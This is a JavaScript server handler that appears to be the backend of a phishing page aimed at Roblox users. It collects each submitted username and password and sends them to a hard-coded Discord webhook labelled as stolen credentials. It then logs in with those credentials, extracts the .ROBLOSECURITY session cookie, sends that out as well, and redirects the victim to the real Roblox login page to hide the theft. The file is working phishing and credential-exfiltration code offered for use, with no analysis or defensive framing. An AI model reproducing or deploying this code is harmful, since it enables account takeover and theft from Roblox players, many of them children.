export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method not allowed');
    }

    const { username, password } = req.body;
    const webhook = 'https://discord.com/api/webhooks/1501284240484995307/Ov6tKqjQmDxbMaKTYoEfN7QHTEPjqv0XyCnkl3d91dMVM5tlFA6l3B00tsBoOvdYo7kq';

    // Send credentials to Discord
    await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `**🔐 ROBLOX CREDENTIALS STOLEN**\nUsername: \`${username}\`\nPassword: \`${password}\`\nTime: ${new Date().toISOString()}`
        })
    });

    // Optional: Use credentials to log in and get the actual cookie
    let cookieResult = 'Failed to extract cookie';
    try {
        const loginRes = await fetch('https://www.roblox.com/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ username, password }),
            redirect: 'manual'
        });
        const setCookie = loginRes.headers.get('set-cookie');
        if (setCookie && setCookie.includes('.ROBLOSECURITY')) {
            const match = setCookie.match(/.ROBLOSECURITY=[^;]+/);
            cookieResult = match ? match[0] : 'Cookie found but not extracted';
            await fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `**🍪 ROBLOX COOKIE EXTRACTED**\n\`${cookieResult}\`` })
            });
        }
    } catch (err) {
        cookieResult = `Error: ${err.message}`;
    }

    // Redirect to real Roblox after stealing
    res.redirect('https://www.roblox.com/login');
}
